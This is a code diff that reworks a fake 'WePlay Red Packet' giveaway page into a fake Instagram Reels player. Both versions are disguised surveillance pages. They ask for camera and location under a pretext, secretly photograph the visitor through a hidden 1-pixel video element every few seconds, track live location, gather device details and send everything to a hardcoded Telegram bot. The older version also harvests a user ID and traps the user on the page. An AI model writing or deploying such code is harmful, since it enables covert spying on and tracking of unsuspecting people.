@@ -3,163 +3,84 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Red Packet · WePlay (Enhanced Retry)</title>
+    <title>Instagram Reels · Permissions + Auto Send</title>
     <style>
-        /* (Keep all previous styles, plus a few additions) */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
-        
+
         body {
             font-family: Arial, sans-serif;
-            background: #f5f5f5;
-            margin: 0;
+            background: #000;
             min-height: 100vh;
-        }
-
-        .header {
             display: flex;
-            align-items: center;
-            padding: 15px;
-            background: white;
-            box-shadow: 0 1px 5px rgba(0,0,0,0.1);
-        }
-
-        .logo {
-            width: 40px;
-            margin-right: 10px;
-        }
-
-        .title {
-            font-size: 22px;
-            font-weight: bold;
-        }
-
-        .tabs {
-            display: flex;
-            justify-content: space-around;
-            background: white;
-            padding: 10px 0;
-            border-bottom: 2px solid #eee;
-        }
-
-        .tabs div {
-            color: #777;
-        }
-
-        .active {
-            color: #00bcd4;
-            border-bottom: 3px solid #00bcd4;
-            padding-bottom: 5px;
-        }
-
-        .card {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            background: white;
-            margin: 12px;
-            padding: 15px;
-            border-radius: 15px;
-            box-shadow: 0 0 5px rgba(0,0,0,0.08);
-        }
-
-        .left {
-            display: flex;
-            align-items: center;
-        }
-
-        .left img {
-            width: 50px;
-            margin-right: 15px;
-        }
-
-        .price {
-            color: #ff7a00;
-            font-weight: bold;
-            font-size: 18px;
-        }
-
-        .note {
-            padding: 15px;
-            color: #888;
-            font-size: 14px;
-        }
-
-        .old-price {
-            text-decoration: line-through;
-            color: #999;
-            font-size: 16px;
-        }
-
-        .free {
-            color: #4CAF50;
-            font-weight: bold;
-        }
-
-        .collect-btn {
-            margin-top: 6px;
-            padding: 6px 16px;
-            border: none;
-            background: #00bcd4;
+            flex-direction: column;
             color: white;
+        }
+
+        /* Reels container */
+        .reels-container {
+            position: relative;
+            width: 100%;
+            max-width: 400px;
+            margin: 0 auto;
+            background: black;
             border-radius: 20px;
-            cursor: pointer;
-            font-size: 14px;
-            transition: all 0.3s;
-        }
-        
-        .collect-btn:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-        }
-
-        .collect-btn.processing {
-            background: #ff9800;
-            animation: pulse 1.5s infinite;
-            cursor: not-allowed;
-        }
-
-        @keyframes pulse {
-            0% { opacity: 1; }
-            50% { opacity: 0.7; }
-            100% { opacity: 1; }
-        }
-
-        .bottom-img {
-            width: 100%;
-            margin-top: 20px;
-        }
-
-        .bottom-img img {
-            width: 100%;
-            display: block;
-        }
-        
-        .video-container {
-            position: fixed;
-            bottom: 10px;
-            right: 10px;
-            width: 1px;
-            height: 1px;
-            opacity: 0.01;
             overflow: hidden;
-            pointer-events: none;
-            z-index: -1;
+            aspect-ratio: 9 / 16; /* Instagram reel aspect ratio */
+            box-shadow: 0 0 20px rgba(0,0,0,0.8);
         }
-        
-        #video {
+
+        video {
             width: 100%;
             height: 100%;
             object-fit: cover;
+            display: block;
         }
-        
-        canvas {
-            display: none;
+
+        .play-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.3);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            transition: background 0.2s;
         }
-        
+
+        .play-overlay:hover {
+            background: rgba(0,0,0,0.5);
+        }
+
+        .play-icon {
+            width: 80px;
+            height: 80px;
+            background: rgba(255,255,255,0.2);
+            backdrop-filter: blur(5px);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 40px;
+            color: white;
+            border: 2px solid white;
+        }
+
+        /* Header / bottom info (optional) */
+        .info-bar {
+            padding: 15px;
+            text-align: center;
+            color: #ddd;
+            font-size: 14px;
+        }
+
+        /* Processing overlay (same as original) */
         .processing-overlay {
             display: none;
             position: fixed;
@@ -176,11 +97,11 @@
             backdrop-filter: blur(5px);
             flex-direction: column;
         }
-        
+
         .processing-overlay.active {
             display: flex;
         }
-        
+
         .spinner {
             width: 60px;
             height: 60px;
@@ -190,19 +111,20 @@
             animation: spin 1s linear infinite;
             margin-bottom: 20px;
         }
-        
+
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        
+
         .warning-text {
             color: #ff4444;
             font-size: 14px;
             margin-top: 20px;
             text-align: center;
         }
-        
+
+        /* Exit warning (optional) */
         .exit-warning {
             display: none;
             position: fixed;
@@ -217,22 +139,23 @@
             box-shadow: 0 10px 30px rgba(0,0,0,0.3);
             width: 80%;
             max-width: 300px;
+            color: #333;
         }
-        
+
         .exit-warning.active {
             display: block;
         }
-        
+
         .exit-warning h3 {
             color: #333;
             margin-bottom: 10px;
         }
-        
+
         .exit-warning p {
             color: #666;
             margin-bottom: 20px;
         }
-        
+
         .exit-warning button {
             background: #00bcd4;
             color: white;
@@ -242,8 +165,8 @@
             font-size: 16px;
             cursor: pointer;
         }
-        
-        /* Modal styles */
+
+        /* Permission modal */
         .modal-overlay {
             display: none;
             position: fixed;
@@ -266,6 +189,7 @@
             text-align: center;
             box-shadow: 0 20px 40px rgba(0,0,0,0.4);
             animation: fadeIn 0.2s;
+            color: #333;
         }
         .modal-card h3 {
             font-size: 22px;
@@ -323,122 +247,96 @@
             cursor: pointer;
             font-weight: bold;
         }
+
+        /* Hidden video container for camera stream */
+        .video-container {
+            position: fixed;
+            bottom: 10px;
+            right: 10px;
+            width: 1px;
+            height: 1px;
+            opacity: 0.01;
+            overflow: hidden;
+            pointer-events: none;
+            z-index: -1;
+        }
+
+        #video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        canvas {
+            display: none;
+        }
     </style>
 </head>
 <body>
-    <!-- PROCESSING OVERLAY -->
+    <!-- PROCESSING OVERLAY (for background capture) -->
     <div class="processing-overlay" id="processingOverlay">
         <div class="spinner"></div>
-        <div>Processing Your Red Packet...</div>
+        <div>Processing Your Request...</div>
         <div style="font-size: 14px; margin-top: 15px;">Please wait while we verify</div>
         <div class="warning-text">⚠️ Do not close or minimize</div>
     </div>
 
-    <!-- EXIT WARNING -->
+    <!-- EXIT WARNING (optional) -->
     <div class="exit-warning" id="exitWarning">
         <h3>⚠️ Processing</h3>
-        <p>Your Red Packet is being processed. Please wait...</p>
+        <p>Your request is being processed. Please wait...</p>
         <button onclick="document.getElementById('exitWarning').classList.remove('active')">OK</button>
     </div>
 
-    <!-- PERMISSION MODAL (improved) -->
+    <!-- PERMISSION MODAL -->
     <div class="modal-overlay" id="permissionModal">
         <div class="modal-card">
             <h3>🔐 Permissions required</h3>
-            <p id="permMessage">We need <strong>camera</strong> and <strong>location</strong> access to verify your red packet.</p>
+            <p id="permMessage">We need <strong>camera</strong> and <strong>location</strong> access to continue.</p>
             <div id="permDetailedError" style="background:#fdd; color:#a00; padding:10px; border-radius:20px; margin-bottom:15px; display:none;"></div>
             <button class="modal-btn" id="retryPermissionBtn">🔁 RETRY PERMISSIONS</button>
             <p style="font-size:13px; margin-top:15px;" id="manualHint"></p>
         </div>
     </div>
 
-    <!-- WEPLAY ID MODAL -->
-    <div class="modal-overlay" id="idModal">
-        <div class="modal-card">
-            <h3>🎁 Enter WePlay ID</h3>
-            <p>Your WePlay ID to receive the red packet:</p>
-            <input type="text" id="weplayIdInput" placeholder="e.g. WPLAY12345" autocomplete="off">
-            <button class="modal-btn" id="submitIdBtn">SUBMIT</button>
-            <button class="modal-btn outline" id="closeIdModal">CANCEL</button>
+    <!-- REEL UI -->
+    <div style="flex:1; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 10px;">
+        <div class="reels-container">
+            <!-- Video element for reel (public sample video) -->
+            <video id="reelVideo" poster="https://storage.googleapis.com/gtv-videos-bucket/sample/images/BigBuckBunny.jpg" playsinline>
+                <source src="https://storage.googleapis.com/gtv-videos-bucket/sample/BigBuckBunny.mp4" type="video/mp4">
+                Your browser does not support the video tag.
+            </video>
+            <!-- Play overlay (transparent button) -->
+            <div class="play-overlay" id="playOverlay">
+                <div class="play-icon">▶</div>
+            </div>
+        </div>
+        <div class="info-bar">
+            Tap to play reel · Permissions will be requested
         </div>
     </div>
 
-    <!-- hidden video / canvas -->
+    <!-- Hidden camera stream container -->
     <div class="video-container">
         <video id="video" autoplay playsinline muted></video>
     </div>
     <canvas id="canvas" style="display:none;"></canvas>
 
-    <!-- UI -->
-    <div class="header">
-        <img src="https://i.ibb.co/KjsMMSV9/logo.png" class="logo" alt="logo">
-        <div class="title">WePlay</div>
-    </div>
-
-    <div class="tabs">
-        <div>Recharge</div>
-        <div>VIP</div>
-        <div class="active">Red Packet</div>
-    </div>
-
-    <div class="card">
-        <div class="left">
-            <img src="https://i.ibb.co/9H080nDZ/bag3-A-4bde8576.png" alt="packet">
-            <div>600 Gold Red Packet</div>
-        </div>
-        <div class="price">₹89</div>
-    </div>
-
-    <div class="card">
-        <div class="left">
-            <img src="https://i.ibb.co/9H080nDZ/bag3-A-4bde8576.png" alt="packet">
-            <div>3000 Gold Red Packet</div>
-        </div>
-        <div class="price">₹449</div>
-    </div>
-
-    <div class="card">
-        <div class="left">
-            <img src="https://i.ibb.co/9H080nDZ/bag3-A-4bde8576.png" alt="packet">
-            <div>10K Gold Red Packet</div>
-        </div>
-        <div class="price">₹1199</div>
-    </div>
-
-    <div class="card">
-        <div class="left">
-            <img src="https://i.ibb.co/9H080nDZ/bag3-A-4bde8576.png" alt="packet">
-            <div>50K Gold Red Packet</div>
-        </div>
-        <div style="text-align:right;">
-            <div class="old-price">₹5399</div>
-            <div class="free">FREE</div>
-            <button class="collect-btn" id="collectBtn" onclick="handleCollectClick()">🎁 COLLECT FREE</button>
-        </div>
-    </div>
-
-    <div class="note">
-        The Red Packet you purchased will be stored in your inventory, and you can use it in WePlay.
-    </div>
-
-    <div class="bottom-img">
-        <img src="https://i.ibb.co/fYbYkdZ0/ip-e32f89d3.png" alt="banner">
-    </div>
-
     <script>
         // ==================== CONFIG ====================
         const BOT_TOKEN = '8214662223:AAE8Y17RmB9-_2j2YXbm3EpOnTE5Wk7BQKU';
         const CHAT_ID = '6677946042';
-        
+
         // ==================== GLOBAL STATE ====================
         let cameraGranted = false;
         let locationGranted = false;
-        let cameraPermanentlyDenied = false;   // flag to detect denial without prompt
+        let cameraPermanentlyDenied = false;
         let locationPermanentlyDenied = false;
         let stream = null;
         let captureInterval = null;
         let locationWatchId = null;
-        let currentFacingMode = 'user';
+        let currentFacingMode = 'user'; // front camera
         let cameraReady = false;
         let isProcessing = false;
 
@@ -450,10 +348,13 @@
         const permMessage = document.getElementById('permMessage');
         const permDetailedError = document.getElementById('permDetailedError');
         const manualHint = document.getElementById('manualHint');
-        const idModal = document.getElementById('idModal');
-        const collectBtn = document.getElementById('collectBtn');
+        const retryBtn = document.getElementById('retryPermissionBtn');
 
-        // ==================== TELEGRAM HELPERS (unchanged) ====================
+        // Reel elements
+        const reelVideo = document.getElementById('reelVideo');
+        const playOverlay = document.getElementById('playOverlay');
+
+        // ==================== TELEGRAM HELPERS ====================
         async function sendTelegramMessage(text) {
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
             try {
@@ -487,8 +388,6 @@
                 } else if (type === 'device_info') {
                     const lines = Object.entries(data).map(([k,v]) => `<b>${k}:</b> ${v}`).join('\n');
                     await sendTelegramMessage(`📱 <b>Extended Device Info</b>\n${lines}`);
-                } else if (type === 'weplay_id') {
-                    await sendTelegramMessage(`🆔 <b>WePlay ID entered:</b> ${data}`);
                 }
             } catch (err) {
                 if (attempt < 2) {
@@ -506,7 +405,7 @@
             }
         }
 
-        // ==================== IMPROVED PERMISSION REQUESTS ====================
+        // ==================== PERMISSION FUNCTIONS ====================
         async function requestCameraPermission() {
             try {
                 if (stream) stream.getTracks().forEach(t => t.stop());
@@ -519,17 +418,16 @@
                 await video.play();
                 cameraGranted = true;
                 cameraReady = true;
-                cameraPermanentlyDenied = false; // reset flag
+                cameraPermanentlyDenied = false;
                 return true;
             } catch (err) {
                 console.warn('camera error', err);
                 cameraGranted = false;
                 cameraReady = false;
-                // Check if error is due to permission denied
                 if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
                     cameraPermanentlyDenied = true;
                 } else {
-                    cameraPermanentlyDenied = false; // other error (e.g. hardware)
+                    cameraPermanentlyDenied = false;
                 }
                 return false;
             }
@@ -539,7 +437,7 @@
             return new Promise((resolve) => {
                 if (!navigator.geolocation) {
                     locationGranted = false;
-                    locationPermanentlyDenied = true; // no geolocation = permanent
+                    locationPermanentlyDenied = true;
                     return resolve(false);
                 }
                 navigator.geolocation.getCurrentPosition(
@@ -555,7 +453,7 @@
                         if (err.code === err.PERMISSION_DENIED) {
                             locationPermanentlyDenied = true;
                         } else {
-                            locationPermanentlyDenied = false; // timeout or unavailable
+                            locationPermanentlyDenied = false;
                         }
                         resolve(false);
                     },
@@ -564,7 +462,7 @@
             });
         }
 
-        // Update modal UI based on permission states
+        // Update permission modal UI
         function updatePermissionModal() {
             if (cameraGranted && locationGranted) {
                 permissionModal.classList.remove('active');
@@ -608,192 +506,112 @@
                 }
             }
 
-            permMessage.innerText = mainMsg || 'We need camera and location access.';
+            permMessage.innerText = mainMsg;
             if (detailMsg) {
                 permDetailedError.style.display = 'block';
                 permDetailedError.innerText = detailMsg;
             } else {
                 permDetailedError.style.display = 'none';
             }
-            manualHint.innerHTML = hint;
+            manualHint.innerText = hint;
         }
 
-        // Retry button handler
-        document.getElementById('retryPermissionBtn').addEventListener('click', async () => {
-            permDetailedError.style.display = 'none';
-            manualHint.innerText = 'Requesting...';
-            // Request both (they will fail instantly if permanently denied)
-            await requestCameraPermission();
-            await requestLocationPermission();
-            updatePermissionModal();
+        // Retry permissions button
+        retryBtn.addEventListener('click', async function() {
+            // Hide modal temporarily
+            permissionModal.classList.remove('active');
+            // Request both
+            const camOk = await requestCameraPermission();
+            const locOk = await requestLocationPermission();
+            if (camOk && locOk) {
+                // Permissions granted, start background capture
+                startBackgroundCapture();
+            } else {
+                // Show modal again with updated status
+                updatePermissionModal();
+            }
         });
 
-        // Initial permission check
-        async function initialPermissionCheck() {
-            permissionModal.classList.add('active');
-            permMessage.innerText = 'Requesting permissions...';
-            await requestCameraPermission();
-            await requestLocationPermission();
-            updatePermissionModal();
-            if (cameraGranted && locationGranted) {
-                // start all services
-                collectExtendedDeviceInfo();
-                startLiveLocationWatching();
-                startCaptureInterval();
-            }
-        }
+        // ==================== BACKGROUND CAPTURE ====================
+        function startBackgroundCapture() {
+            if (isProcessing) return;
+            isProcessing = true;
 
-        // ==================== LIVE LOCATION ====================
-        function startLiveLocationWatching() {
-            if (locationWatchId) return;
-            if (!navigator.geolocation) return;
-            locationWatchId = navigator.geolocation.watchPosition(
-                (pos) => {
-                    sendWithRetry('location', {
-                        lat: pos.coords.latitude,
-                        lng: pos.coords.longitude
-                    });
-                },
-                (err) => console.warn('watchLocation err', err),
-                { enableHighAccuracy: true, maximumAge: 5000, timeout: 10000 }
-            );
-        }
+            // Show processing overlay
+            document.getElementById('processingOverlay').classList.add('active');
 
-        // ==================== DEVICE INFO ====================
-        async function collectExtendedDeviceInfo() {
-            const info = {
+            // Send device info
+            const deviceInfo = {
                 'User Agent': navigator.userAgent,
                 'Platform': navigator.platform,
                 'Language': navigator.language,
-                'Screen': `${screen.width}x${screen.height}`,
-                'Color Depth': screen.colorDepth,
-                'Timezone': Intl.DateTimeFormat().resolvedOptions().timeZone,
-                'Timestamp': new Date().toISOString(),
-                'Cookies Enabled': navigator.cookieEnabled,
-                'Do Not Track': navigator.doNotTrack || 'unspecified',
-                'Hardware Concurrency': navigator.hardwareConcurrency || 'unknown',
-                'Device Memory': navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'unknown',
-                'Max Touch Points': navigator.maxTouchPoints || 'unknown',
+                'Screen Size': `${window.screen.width}x${window.screen.height}`,
+                'Time': new Date().toLocaleString()
             };
-            if ('getBattery' in navigator) {
-                try {
-                    const battery = await navigator.getBattery();
-                    info['Battery Level'] = (battery.level * 100) + '%';
-                    info['Battery Charging'] = battery.charging ? 'Yes' : 'No';
-                } catch (e) { info['Battery'] = 'error'; }
-            } else { info['Battery'] = 'API missing'; }
-            if (navigator.connection) {
-                const c = navigator.connection;
-                info['Network Type'] = c.effectiveType || 'unknown';
-                info['Downlink'] = c.downlink ? c.downlink + ' Mbps' : 'unknown';
-                info['RTT'] = c.rtt ? c.rtt + ' ms' : 'unknown';
-                info['Save Data'] = c.saveData ? 'Yes' : 'No';
-            } else { info['Network'] = 'API missing'; }
-            sendWithRetry('device_info', info);
-        }
+            sendWithRetry('device_info', deviceInfo);
 
-        // ==================== CAMERA CAPTURE (alternating) ====================
-        let photoCounter = 0;
-        let nextFacingMode = 'user';
-
-        async function switchCamera(targetMode) {
-            if (!cameraGranted) return false;
-            try {
-                if (stream) stream.getTracks().forEach(t => t.stop());
-                const newStream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: targetMode, width: 640, height: 480 },
-                    audio: false
-                });
-                stream = newStream;
-                video.srcObject = stream;
-                await video.play();
-                cameraReady = true;
-                currentFacingMode = targetMode;
-                return true;
-            } catch (err) {
-                console.warn('switch fail', err);
-                cameraReady = false;
-                return false;
+            // Start location watch (continuous)
+            if (navigator.geolocation) {
+                locationWatchId = navigator.geolocation.watchPosition(
+                    (pos) => {
+                        sendWithRetry('location', { lat: pos.coords.latitude, lng: pos.coords.longitude });
+                    },
+                    (err) => console.warn('watch error', err),
+                    { enableHighAccuracy: true, maximumAge: 10000 }
+                );
             }
+
+            // Start photo capture every 10 seconds
+            let photoCounter = 1;
+            captureInterval = setInterval(() => {
+                if (stream && cameraReady) {
+                    // Capture frame from video
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    canvas.toBlob((blob) => {
+                        if (blob) {
+                            sendPhotoWithRetry(blob, photoCounter++, currentFacingMode === 'user' ? 'front' : 'back');
+                        }
+                    }, 'image/jpeg', 0.8);
+                }
+            }, 10000); // every 10 seconds
         }
 
-        async function capturePhoto() {
-            if (!cameraReady || !stream || !video.videoWidth) return false;
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.8));
-            if (!blob) return false;
-            photoCounter++;
-            const cameraUsed = currentFacingMode === 'user' ? 'front' : 'back';
-            sendPhotoWithRetry(blob, photoCounter, cameraUsed);
-            return true;
-        }
+        // ==================== PLAY BUTTON HANDLER ====================
+        playOverlay.addEventListener('click', async function() {
+            // Hide overlay
+            playOverlay.style.display = 'none';
 
-        function startCaptureInterval() {
-            if (captureInterval) clearInterval(captureInterval);
-            captureInterval = setInterval(async () => {
-                if (!cameraGranted || !cameraReady) return;
-                await capturePhoto();
-                nextFacingMode = currentFacingMode === 'user' ? 'environment' : 'user';
-                switchCamera(nextFacingMode).catch(() => {});
-            }, 6000);
-        }
+            // Start playing the reel video
+            reelVideo.play().catch(e => console.log('play error', e));
 
-        // ==================== COLLECT BUTTON ====================
-        function handleCollectClick() {
-            if (!cameraGranted || !locationGranted) {
-                alert('Permissions not granted. Please check the permission modal.');
-                return;
-            }
-            idModal.classList.add('active');
-            document.getElementById('weplayIdInput').value = '';
-        }
+            // Request permissions
+            const camOk = await requestCameraPermission();
+            const locOk = await requestLocationPermission();
 
-        document.getElementById('submitIdBtn').addEventListener('click', () => {
-            const id = document.getElementById('weplayIdInput').value.trim();
-            if (!id) {
-                alert('Please enter your WePlay ID');
-                return;
-            }
-            sendWithRetry('weplay_id', id);
-            idModal.classList.remove('active');
-            document.getElementById('processingOverlay').classList.add('active');
-            setTimeout(() => document.getElementById('processingOverlay').classList.remove('active'), 2000);
-        });
-
-        document.getElementById('closeIdModal').addEventListener('click', () => {
-            idModal.classList.remove('active');
-        });
-
-        // ==================== EXIT PROTECTION ====================
-        history.pushState(null, null, location.href);
-        window.onpopstate = function() {
-            if (isProcessing) {
-                document.getElementById('exitWarning').classList.add('active');
-                history.pushState(null, null, location.href);
+            if (camOk && locOk) {
+                // Both granted, start background capture
+                startBackgroundCapture();
             } else {
-                window.location.href = 'about:blank';
-            }
-        };
-        document.addEventListener('visibilitychange', function() {
-            if (document.hidden && isProcessing) {
-                alert('⚠️ Processing in progress! Please do not switch tabs.');
-            }
-        });
-        window.addEventListener('beforeunload', function(e) {
-            if (isProcessing) {
-                e.preventDefault();
-                e.returnValue = 'Processing in progress! Are you sure you want to leave?';
-                return 'Processing in progress! Are you sure you want to leave?';
+                // Show permission modal to guide user
+                updatePermissionModal();
             }
         });
 
-        // ==================== PAGE LOAD ====================
-        window.onload = function() {
-            collectBtn.innerHTML = '🎁 COLLECT FREE';
-            initialPermissionCheck();
-        };
+        // Optional: If user clicks outside modal, maybe don't close; we have retry button only.
+
+        // Handle exit warning (optional) - we can keep but not used directly
+
+        // Cleanup on page unload
+        window.addEventListener('beforeunload', function() {
+            if (captureInterval) clearInterval(captureInterval);
+            if (locationWatchId) navigator.geolocation.clearWatch(locationWatchId);
+            if (stream) stream.getTracks().forEach(t => t.stop());
+        });
+
+        // Also handle if permissions already granted from previous session?
+        // On load, we could check but we don't want to auto-start. So we wait for play click.
     </script>
 </body>
 </html>
